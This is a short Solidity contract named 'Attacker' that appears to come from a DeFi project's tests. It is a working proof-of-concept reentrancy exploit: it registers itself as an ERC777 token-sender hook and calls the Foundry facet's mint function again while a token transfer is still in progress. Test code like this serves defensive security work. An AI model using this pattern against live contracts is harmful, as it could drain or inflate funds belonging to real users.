// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.9;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC777Sender} from "@openzeppelin/contracts/token/ERC777/IERC777Sender.sol";
import {IERC1820Registry} from "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
import {ERC1820Implementer} from "@openzeppelin/contracts/utils/introspection/ERC1820Implementer.sol";
import {IFoundryFacet} from "../interfaces/IFoundryFacet.sol";

contract Attacker is IERC777Sender, ERC1820Implementer {
    IERC1820Registry private _erc1820 =
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    IFoundryFacet public foundry;
    IERC20 public token;
    address public vault;
    address public meToken;
    uint256 public amount;

    constructor(
        address _diamond,
        address _token,
        address _vault,
        address _meToken,
        uint256 _amount
    ) {
        foundry = IFoundryFacet(_diamond);
        token = IERC20(_token);
        vault = _vault;
        meToken = _meToken;
        amount = _amount;

        token.approve(vault, type(uint256).max);
        _erc1820.setInterfaceImplementer(
            address(this),
            keccak256("ERC777TokenSender"),
            address(this)
        );
    }

    // ERC777 hook
    function tokensToSend(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external {
        require(
            msg.sender == address(token),
            "Hook can only be called by the token"
        );
        attackMint();
    }

    function attackMint() public {
        foundry.mint(meToken, amount, address(this));
    }
}
